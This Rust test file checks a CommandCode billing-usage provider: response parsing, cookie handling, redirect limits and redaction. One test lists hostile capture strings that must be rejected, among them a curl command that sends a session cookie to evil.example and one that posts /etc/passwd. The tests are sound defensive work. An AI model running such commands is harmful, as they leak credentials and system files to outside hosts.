use std::time::{Duration, Instant};

use oab_domain::{
    AccountKey, AccountScope, ErrorKind, ExtensionValue, ProviderExtensionKind, ProviderId,
    ProviderInstanceId, Timestamp,
};
use oab_providers::context::ProviderContext;
use oab_providers::cookie::{
    CookieDomainKind, CookieImport, CookieImportOrder, CookieJar, CookieRecord, CookieRecordSpec,
    CookieSourceId,
};
use oab_providers::descriptor::ProviderSource;
use oab_providers::providers::commandcode::{
    CommandCodeProvider, CommandCodeRouteSet, parse_commandcode_responses,
};
use oab_test_support::http::{FakeHttpResponse, FakeHttpServer};
use time::OffsetDateTime;
use tokio_util::sync::CancellationToken;

const CREDITS: &[u8] = include_bytes!("../../../fixtures/providers/commandcode/credits.json");
const SUBSCRIPTION: &[u8] =
    include_bytes!("../../../fixtures/providers/commandcode/subscription.json");

const NOW_SECONDS: i64 = 1_780_000_000;
const COOKIE_CANARY: &str = "commandcode-cookie-canary";

fn scope() -> AccountScope {
    account_scope("account-a")
}

fn account_scope(account: &str) -> AccountScope {
    AccountScope::new(
        ProviderId::CommandCode,
        ProviderInstanceId::new("commandcode-primary").expect("provider instance"),
        AccountKey::new(account).expect("account key"),
    )
}

fn timestamp(seconds: i64) -> Timestamp {
    Timestamp::from_unix_timestamp(seconds).expect("fixture timestamp")
}

fn now() -> OffsetDateTime {
    OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("fixture time")
}

fn context(account: &str, source: ProviderSource) -> ProviderContext {
    ProviderContext::new(account_scope(account), source, CancellationToken::new())
}

fn routes(
    web: &FakeHttpServer,
    credits: &FakeHttpServer,
    subscriptions: &FakeHttpServer,
) -> CommandCodeRouteSet {
    CommandCodeRouteSet::loopback(
        web.url("/ignored?x=1"),
        credits.url("/wrong"),
        subscriptions.url("/also-wrong"),
    )
    .expect("loopback routes")
}

fn manual_provider(
    web: &FakeHttpServer,
    credits: &FakeHttpServer,
    subscriptions: &FakeHttpServer,
    capture: &str,
) -> CommandCodeProvider {
    CommandCodeProvider::from_manual_capture_routes(
        scope(),
        capture,
        routes(web, credits, subscriptions),
    )
    .expect("manual CommandCode provider")
}

fn cookie_record(
    name: &str,
    value: &str,
    path: &str,
    expires_at: Option<OffsetDateTime>,
) -> CookieRecord {
    CookieRecord::new(CookieRecordSpec {
        name,
        value,
        domain: "127.0.0.1",
        domain_kind: CookieDomainKind::HostOnly,
        path,
        secure: false,
        expires_at,
    })
    .expect("cookie record")
}

fn cookie_jar(records: Vec<CookieRecord>) -> CookieJar {
    let source = CookieSourceId::new(41);
    let order = CookieImportOrder::new([source]).expect("cookie source order");
    let import = CookieImport::new(source, records).expect("cookie import");
    CookieJar::from_imports(&order, [import]).expect("cookie jar")
}

fn bool_fact(sample: &oab_domain::UsageSample, key: &str) -> bool {
    let extension = sample
        .extensions()
        .iter()
        .find(|extension| extension.kind() == ProviderExtensionKind::CommandCodeMarkers)
        .expect("CommandCode extension");
    match extension
        .facts()
        .iter()
        .find(|fact| fact.key() == key)
        .expect("marker")
        .value()
    {
        ExtensionValue::Boolean { value } => *value,
        _ => panic!("marker must be boolean"),
    }
}

fn assert_percent(actual: f64, expected: f64) {
    assert!((actual - expected).abs() < 1e-9, "{actual} != {expected}");
}

#[test]
fn golden_responses_map_rolling_and_monthly_windows() {
    let sample = parse_commandcode_responses(
        scope(),
        timestamp(NOW_SECONDS),
        CREDITS,
        Some(SUBSCRIPTION),
        false,
        ProviderSource::ManualCookie,
    )
    .expect("CommandCode fixture");

    assert_percent(
        sample
            .primary()
            .expect("five-hour window")
            .used_percent()
            .expect("known usage")
            .get(),
        25.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly window")
            .used_percent()
            .expect("known usage")
            .get(),
        20.0,
    );
    let monthly = sample.tertiary().expect("monthly window");
    assert!((monthly.used_percent().expect("known usage").get() - 12.216).abs() < 0.001);
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("plan label")
            .as_str(),
        "Go · $1.22 of $10.00 · + $2.50 credits",
    );
    assert_eq!(
        sample
            .primary()
            .expect("primary")
            .duration()
            .expect("five-hour duration")
            .seconds(),
        5 * 60 * 60
    );
    assert_eq!(
        sample
            .secondary()
            .expect("secondary")
            .duration()
            .expect("weekly duration")
            .seconds(),
        7 * 24 * 60 * 60
    );
    assert_eq!(
        sample
            .tertiary()
            .expect("tertiary")
            .duration()
            .expect("monthly sentinel")
            .seconds(),
        30 * 24 * 60 * 60
    );
    assert_eq!(
        sample
            .subscription_renews_at()
            .expect("period end")
            .unix_timestamp(),
        1_782_864_000
    );
    assert!(!bool_fact(&sample, "subscription_enrichment_unavailable"));
    assert!(bool_fact(&sample, "has_subscription_plan"));
    assert!(!bool_fact(&sample, "monthly_grant_depleted"));
    assert_eq!(sample.provenance()[0].source(), "commandcode");
    assert_eq!(sample.provenance()[0].strategy(), "manual_cookie");
}

#[test]
fn nested_limits_string_numbers_and_free_tier_semantics_match_baseline() {
    let nested = br#"{
      "credits": {
        "monthlyCredits":"7.25", "purchasedCredits":"2",
        "windowLimits": {
          "fiveHour":{"cap":"4","used":"1","resetAt":"1780200000"},
          "weekly":{"cap":20,"used":4,"resetAt":1780300000000}
        }
      }
    }"#;
    let free = br#"{"success":true,"data":null}"#;
    let sample = parse_commandcode_responses(
        scope(),
        timestamp(NOW_SECONDS),
        nested,
        Some(free),
        false,
        ProviderSource::BrowserSession,
    )
    .expect("nested free account");
    assert_percent(
        sample
            .primary()
            .expect("five hour")
            .used_percent()
            .expect("known")
            .get(),
        25.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("known")
            .get(),
        20.0,
    );
    assert_percent(
        sample
            .tertiary()
            .expect("free allowance")
            .used_percent()
            .expect("known")
            .get(),
        0.0,
    );
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("free balance")
            .as_str(),
        "$7.25 remaining · + $2.00 credits"
    );
    assert!(!bool_fact(&sample, "has_subscription_plan"));
    assert_eq!(sample.provenance()[0].strategy(), "browser_session");
}

#[test]
fn zero_free_tier_has_no_monthly_window_and_unknown_plan_rules_are_explicit() {
    let zero = br#"{"credits":{"monthlyCredits":0}}"#;
    let free = br#"{"success":true,"data":null}"#;
    let sample = parse_commandcode_responses(
        scope(),
        timestamp(NOW_SECONDS),
        zero,
        Some(free),
        false,
        ProviderSource::ManualCookie,
    )
    .expect("zero free tier");
    assert!(sample.tertiary().is_none());
    assert!(sample.identity().login_method().is_none());
    assert!(bool_fact(&sample, "monthly_grant_depleted"));

    for (status, should_fail) in [("active", true), ("canceled", false)] {
        let subscription = format!(
            r#"{{"success":true,"data":{{"planId":"individual-future","status":"{status}"}}}}"#
        );
        let result = parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            zero,
            Some(subscription.as_bytes()),
            false,
            ProviderSource::ManualCookie,
        );
        assert_eq!(result.is_err(), should_fail);
    }
}

#[test]
fn complete_plan_catalog_and_case_insensitive_ids_match_baseline() {
    for (plan_id, total, expected_label) in [
        ("INDIVIDUAL-GO", 10_u32, "Go · $1.00 of $10.00"),
        ("individual-goat", 70, "GOAT · $1.00 of $70.00"),
        ("individual-pro", 30, "Pro · $1.00 of $30.00"),
        ("individual-pro-v1", 80, "Pro · $1.00 of $80.00"),
        ("individual-max", 150, "Max · $1.00 of $150"),
        ("individual-ultra", 300, "Ultra · $1.00 of $300"),
    ] {
        let credits = format!(r#"{{"credits":{{"monthlyCredits":{}}}}}"#, total - 1);
        let subscription =
            format!(r#"{{"success":true,"data":{{"planId":"{plan_id}","status":"active"}}}}"#);
        let sample = parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            credits.as_bytes(),
            Some(subscription.as_bytes()),
            false,
            ProviderSource::ManualCookie,
        )
        .expect("known CommandCode plan");

        assert_percent(
            sample
                .tertiary()
                .expect("monthly plan window")
                .used_percent()
                .expect("known monthly usage")
                .get(),
            100.0 / f64::from(total),
        );
        assert_eq!(
            sample
                .identity()
                .login_method()
                .expect("plan label")
                .as_str(),
            expected_label
        );
    }
}

#[test]
fn optional_subscription_parse_failure_is_marked_without_discarding_credits() {
    for subscription in [
        br"{}".as_slice(),
        br#"{"success":false,"data":null}"#.as_slice(),
        br#"{"success":true}"#.as_slice(),
        br#"{"success":true,"data":{}}"#.as_slice(),
    ] {
        let sample = parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            CREDITS,
            Some(subscription),
            false,
            ProviderSource::ManualCookie,
        )
        .expect("credits survive optional parse failure");
        assert!(bool_fact(&sample, "subscription_enrichment_unavailable"));
        assert!(!bool_fact(&sample, "has_subscription_plan"));
    }

    let missing = parse_commandcode_responses(
        scope(),
        timestamp(NOW_SECONDS),
        CREDITS,
        None,
        false,
        ProviderSource::ManualCookie,
    )
    .expect("required credits survive absent enrichment");
    assert!(bool_fact(&missing, "subscription_enrichment_unavailable"));
}

#[tokio::test]
async fn manual_fetch_sends_both_exact_requests_and_forwards_normalized_cookie() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
    let subscriptions =
        FakeHttpServer::start([FakeHttpResponse::new(200, SUBSCRIPTION.to_vec())]).await;
    let provider = manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("other=allowed; session={COOKIE_CANARY}"),
    );
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("manual fetch");
    assert!(bool_fact(&sample, "has_subscription_plan"));

    for (server, path) in [
        (&credits, "/internal/billing/credits"),
        (&subscriptions, "/internal/billing/subscriptions"),
    ] {
        let requests = server.requests();
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(request.method(), "GET");
        assert_eq!(request.target(), path);
        assert_eq!(request.body(), b"");
        assert_eq!(
            request.header("accept"),
            Some("application/json, text/plain, */*")
        );
        assert_eq!(request.header("accept-language"), Some("en-US,en;q=0.9"));
        assert_eq!(request.header("origin"), Some("https://commandcode.ai"));
        assert_eq!(request.header("referer"), Some("https://commandcode.ai/"));
        assert_eq!(
            request.header("user-agent"),
            Some(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 \
                 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
            )
        );
        let cookie = request.header("cookie").expect("cookie header");
        assert_eq!(cookie, format!("other=allowed; session={COOKIE_CANARY}"));
    }
}

#[tokio::test]
async fn bare_token_and_curl_capture_are_inert_and_host_bound() {
    for capture in [
        COOKIE_CANARY.to_owned(),
        format!(
            "curl 'https://commandcode.ai/studio?ignored=1' -H 'Cookie: session={COOKIE_CANARY}'"
        ),
        format!(
            "curl 'https://api.commandcode.ai/internal/billing/credits' -b 'session={COOKIE_CANARY}'"
        ),
    ] {
        let web = FakeHttpServer::start([]).await;
        let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
        let subscriptions =
            FakeHttpServer::start([FakeHttpResponse::new(200, SUBSCRIPTION.to_vec())]).await;
        manual_provider(&web, &credits, &subscriptions, &capture)
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("capture succeeds");
        let cookie = credits.requests()[0]
            .header("cookie")
            .expect("cookie")
            .to_owned();
        assert!(cookie.contains(COOKIE_CANARY));
        if capture == COOKIE_CANARY {
            assert_eq!(
                cookie,
                format!("__Secure-better-auth.session_token={COOKIE_CANARY}")
            );
        }
    }

    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([]).await;
    let subscriptions = FakeHttpServer::start([]).await;
    for capture in [
        "",
        "curl 'https://evil.example/' -H 'Cookie: session=secret'",
        "curl 'http://commandcode.ai/' -H 'Cookie: session=secret'",
        "curl 'https://commandcode.ai/' --data '@/etc/passwd' -H 'Cookie: session=secret'",
    ] {
        assert!(
            CommandCodeProvider::from_manual_capture_routes(
                scope(),
                capture,
                routes(&web, &credits, &subscriptions),
            )
            .is_err()
        );
    }
    assert!(credits.requests().is_empty());
}

#[tokio::test]
async fn browser_cookie_selection_uses_web_origin_not_api_path() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
    let subscriptions =
        FakeHttpServer::start([FakeHttpResponse::new(200, SUBSCRIPTION.to_vec())]).await;
    let jar = cookie_jar(vec![
        cookie_record("web-session", COOKIE_CANARY, "/", None),
        cookie_record("api-only-canary", "must-not-cross", "/internal", None),
        cookie_record(
            "expired",
            "must-not-cross",
            "/",
            Some(now() - time::Duration::seconds(1)),
        ),
    ]);
    let provider = CommandCodeProvider::from_browser_jar_routes(
        scope(),
        &jar,
        now(),
        routes(&web, &credits, &subscriptions),
    )
    .expect("browser provider");
    provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("browser fetch");
    for server in [&credits, &subscriptions] {
        let requests = server.requests();
        let cookie = requests[0].header("cookie").expect("cookie");
        assert_eq!(cookie, format!("web-session={COOKIE_CANARY}"));
        assert!(!cookie.contains("must-not-cross"));
    }
}

#[tokio::test]
async fn browser_missing_expired_and_unmatched_cookies_fail_before_network() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([]).await;
    let subscriptions = FakeHttpServer::start([]).await;
    for (jar, expected) in [
        (cookie_jar(Vec::new()), ErrorKind::MissingCredential),
        (
            cookie_jar(vec![cookie_record("api-only", "x", "/internal", None)]),
            ErrorKind::AuthenticationExpired,
        ),
        (
            cookie_jar(vec![cookie_record(
                "expired",
                "x",
                "/",
                Some(now() - time::Duration::seconds(1)),
            )]),
            ErrorKind::AuthenticationExpired,
        ),
    ] {
        let error = CommandCodeProvider::from_browser_jar_routes(
            scope(),
            &jar,
            now(),
            routes(&web, &credits, &subscriptions),
        )
        .expect_err("invalid browser session");
        assert_eq!(error.kind(), expected);
    }
    assert!(credits.requests().is_empty());
    assert!(subscriptions.requests().is_empty());
}

#[tokio::test]
async fn context_scope_source_and_provider_are_isolated() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([]).await;
    let subscriptions = FakeHttpServer::start([]).await;
    let provider = manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    );
    for invalid in [
        context("account-b", ProviderSource::ManualCookie),
        context("account-a", ProviderSource::BrowserSession),
    ] {
        assert_eq!(
            provider
                .fetch_at(&invalid, timestamp(NOW_SECONDS))
                .await
                .expect_err("context mismatch")
                .kind(),
            ErrorKind::Api
        );
    }
    let wrong_scope = AccountScope::new(
        ProviderId::Perplexity,
        ProviderInstanceId::new("wrong-primary").expect("instance"),
        AccountKey::new("account-a").expect("account"),
    );
    assert!(
        CommandCodeProvider::from_manual_capture_routes(
            wrong_scope,
            &format!("session={COOKIE_CANARY}"),
            routes(&web, &credits, &subscriptions),
        )
        .is_err()
    );

    let cancellation = CancellationToken::new();
    cancellation.cancel();
    let cancelled = ProviderContext::new(scope(), ProviderSource::ManualCookie, cancellation);
    assert_eq!(
        provider
            .fetch_at(&cancelled, timestamp(NOW_SECONDS))
            .await
            .expect_err("pre-cancelled request")
            .kind(),
        ErrorKind::Network
    );
    assert!(credits.requests().is_empty());
    assert!(subscriptions.requests().is_empty());
}

#[tokio::test]
async fn required_statuses_and_success_range_are_handled() {
    let oversized = vec![b'x'; 2 * 1024 * 1024 + 1];
    for (status, response) in [
        (401, FakeHttpResponse::new(401, oversized.clone())),
        (
            403,
            FakeHttpResponse::truncated(403, 100, b"short".to_vec()),
        ),
    ] {
        let web = FakeHttpServer::start([]).await;
        let credits = FakeHttpServer::start([response]).await;
        let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
        let error = manual_provider(
            &web,
            &credits,
            &subscriptions,
            &format!("session={COOKIE_CANARY}"),
        )
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("authentication status");
        assert_eq!(
            error.kind(),
            ErrorKind::AuthenticationExpired,
            "status {status}"
        );
    }

    for (status, body) in [
        (400, oversized.clone()),
        (408, oversized.clone()),
        (429, oversized.clone()),
        (500, oversized.clone()),
    ] {
        let web = FakeHttpServer::start([]).await;
        let credits = FakeHttpServer::start([FakeHttpResponse::new(status, body)]).await;
        let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
        let error = manual_provider(
            &web,
            &credits,
            &subscriptions,
            &format!("session={COOKIE_CANARY}"),
        )
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("non-authentication status");
        assert_eq!(error.kind(), ErrorKind::Api, "status {status}");
    }

    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::new(201, CREDITS.to_vec())]).await;
    let subscriptions =
        FakeHttpServer::start([FakeHttpResponse::new(201, SUBSCRIPTION.to_vec())]).await;
    manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    )
    .fetch_at(
        &context("account-a", ProviderSource::ManualCookie),
        timestamp(NOW_SECONDS),
    )
    .await
    .expect("all 2xx statuses are accepted");
}

#[tokio::test]
async fn redirects_are_same_origin_bounded_and_do_not_leak_cookies() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([
        FakeHttpResponse::new(302, Vec::new()).header("location", "/internal/billing/credits"),
        FakeHttpResponse::new(200, CREDITS.to_vec()),
    ])
    .await;
    let subscriptions =
        FakeHttpServer::start([FakeHttpResponse::new(200, SUBSCRIPTION.to_vec())]).await;
    manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    )
    .fetch_at(
        &context("account-a", ProviderSource::ManualCookie),
        timestamp(NOW_SECONDS),
    )
    .await
    .expect("guarded same-origin redirect");
    assert_eq!(credits.requests().len(), 2);
    let expected_cookie = format!("session={COOKIE_CANARY}");
    for request in credits.requests() {
        assert_eq!(request.header("cookie"), Some(expected_cookie.as_str()));
    }

    let web = FakeHttpServer::start([]).await;
    let web_redirect = web.url("/login").to_string();
    let oversized = vec![b'x'; 2 * 1024 * 1024 + 1];
    let credits = FakeHttpServer::start([
        FakeHttpResponse::new(302, oversized).header("location", web_redirect)
    ])
    .await;
    let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    assert_eq!(
        manual_provider(
            &web,
            &credits,
            &subscriptions,
            &format!("session={COOKIE_CANARY}"),
        )
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("cross-origin redirect rejected before credential forwarding")
        .kind(),
        ErrorKind::Api
    );
    assert!(web.requests().is_empty());
}

#[tokio::test]
async fn optional_failure_and_grace_timeout_return_credits_with_marker() {
    let oversized = vec![b'x'; 2 * 1024 * 1024 + 1];
    for response in [
        FakeHttpResponse::new(401, oversized.clone()),
        FakeHttpResponse::truncated(403, 100, b"short".to_vec()),
        FakeHttpResponse::new(429, oversized.clone()),
        FakeHttpResponse::new(500, b"unavailable".to_vec()),
        FakeHttpResponse::new(204, Vec::new()),
        FakeHttpResponse::new(200, b"not-json".to_vec()),
        FakeHttpResponse::new(200, oversized),
        FakeHttpResponse::truncated(200, 100, b"short".to_vec()),
    ] {
        let web = FakeHttpServer::start([]).await;
        let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
        let subscriptions = FakeHttpServer::start([response]).await;
        let sample = manual_provider(
            &web,
            &credits,
            &subscriptions,
            &format!("session={COOKIE_CANARY}"),
        )
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("optional failure is soft");
        assert!(bool_fact(&sample, "subscription_enrichment_unavailable"));
    }

    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
    let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let provider = manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    );
    let started = Instant::now();
    let sample = provider
        .fetch_at_with_subscription_grace(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
            Duration::from_millis(20),
        )
        .await
        .expect("grace timeout is soft");
    assert!(bool_fact(&sample, "subscription_enrichment_unavailable"));
    assert!(started.elapsed() < Duration::from_millis(500));
}

#[tokio::test]
async fn successful_required_responses_are_bounded_and_diagnostics_are_redacted() {
    for response in [
        FakeHttpResponse::new(200, vec![b'x'; 2 * 1024 * 1024 + 1]),
        FakeHttpResponse::truncated(200, 100, b"short".to_vec()),
    ] {
        let web = FakeHttpServer::start([]).await;
        let credits = FakeHttpServer::start([response]).await;
        let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
        let provider = manual_provider(
            &web,
            &credits,
            &subscriptions,
            &format!("session={COOKIE_CANARY}"),
        );
        let provider_debug = format!("{provider:?}");
        assert!(!provider_debug.contains(COOKIE_CANARY));
        assert!(provider_debug.contains("<redacted>"));
        let error = provider
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect_err("malformed successful response");
        assert_eq!(error.kind(), ErrorKind::Parse);
        let diagnostics = format!("{error} {error:?}");
        assert!(!diagnostics.contains(COOKIE_CANARY));
    }
}

#[tokio::test]
async fn subscription_starts_while_required_credits_are_still_pending() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let subscriptions =
        FakeHttpServer::start([FakeHttpResponse::new(200, SUBSCRIPTION.to_vec())]).await;
    let provider = manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    );
    let execution = CancellationToken::new();
    let execution_for_context = execution.clone();
    let cancellation = execution.clone();
    let context =
        ProviderContext::new(scope(), ProviderSource::ManualCookie, execution_for_context);
    let cancel_task = tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(100)).await;
        cancellation.cancel();
    });
    let error = provider
        .fetch_at_with_subscription_grace(&context, timestamp(NOW_SECONDS), Duration::from_secs(5))
        .await
        .expect_err("required credits remain stalled");
    cancel_task.await.expect("cancel task");
    assert_eq!(error.kind(), ErrorKind::Network);
    assert_eq!(credits.requests().len(), 1);
    assert_eq!(subscriptions.requests().len(), 1);
}

#[tokio::test]
async fn cancellation_after_credits_never_returns_a_partial_snapshot() {
    let web = FakeHttpServer::start([]).await;
    let credits = FakeHttpServer::start([FakeHttpResponse::new(200, CREDITS.to_vec())]).await;
    let subscriptions = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let provider = manual_provider(
        &web,
        &credits,
        &subscriptions,
        &format!("session={COOKIE_CANARY}"),
    );
    let cancellation = CancellationToken::new();
    let cancel_task = {
        let cancellation = cancellation.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(50)).await;
            cancellation.cancel();
        })
    };
    let context = ProviderContext::new(scope(), ProviderSource::ManualCookie, cancellation);
    let started = Instant::now();
    let error = provider
        .fetch_at_with_subscription_grace(&context, timestamp(NOW_SECONDS), Duration::from_secs(5))
        .await
        .expect_err("cancellation wins");
    cancel_task.await.expect("cancel task");
    assert_eq!(error.kind(), ErrorKind::Network);
    assert!(started.elapsed() < Duration::from_millis(500));
}

#[test]
fn parser_rejects_missing_required_values_extremes_and_structural_bombs() {
    for credits in [
        br"{}".as_slice(),
        br#"{"credits":{}}"#.as_slice(),
        br#"{"credits":{"monthlyCredits":"NaN"}}"#.as_slice(),
        br#"{"credits":{"monthlyCredits":1000000000000001}}"#.as_slice(),
    ] {
        assert_eq!(
            parse_commandcode_responses(
                scope(),
                timestamp(NOW_SECONDS),
                credits,
                Some(SUBSCRIPTION),
                false,
                ProviderSource::ManualCookie,
            )
            .expect_err("malformed required credits")
            .kind(),
            ErrorKind::Parse
        );
    }

    let deep_value = format!("{}0{}", "[".repeat(42), "]".repeat(42));
    let deep = format!(r#"{{"credits":{{"monthlyCredits":1,"x":{deep_value}}}}}"#);
    assert!(
        parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            deep.as_bytes(),
            None,
            true,
            ProviderSource::ManualCookie,
        )
        .is_err()
    );

    let wide = format!(
        r#"{{"credits":{{"monthlyCredits":1}},"x":[{}]}}"#,
        std::iter::repeat_n("0", 32_769)
            .collect::<Vec<_>>()
            .join(",")
    );
    assert!(
        parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            wide.as_bytes(),
            None,
            true,
            ProviderSource::ManualCookie,
        )
        .is_err()
    );

    let oversized = vec![b' '; 2 * 1024 * 1024 + 1];
    assert!(
        parse_commandcode_responses(
            scope(),
            timestamp(NOW_SECONDS),
            &oversized,
            None,
            true,
            ProviderSource::ManualCookie,
        )
        .is_err()
    );
}

#[test]
fn malformed_optional_fields_default_without_poisoning_required_credits() {
    let credits = br#"{
      "credits": {
        "monthlyCredits": 5,
        "purchasedCredits": {},
        "premiumMonthlyCredits": "Infinity",
        "opensourceMonthlyCredits": null
      },
      "windowLimits": {
        "fiveHour":{"cap":0,"used":99},
        "weekly":{"cap":10,"used":"bad","resetAt":"bad"}
      }
    }"#;
    let sample = parse_commandcode_responses(
        scope(),
        timestamp(NOW_SECONDS),
        credits,
        Some(br#"{"success":true,"data":null}"#),
        false,
        ProviderSource::ManualCookie,
    )
    .expect("optional fields are lossy");
    assert!(sample.primary().is_none());
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("known")
            .get(),
        0.0,
    );
    assert!(sample.secondary().expect("weekly").resets_at().is_none());
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("remaining label")
            .as_str(),
        "$5.00 remaining"
    );
}
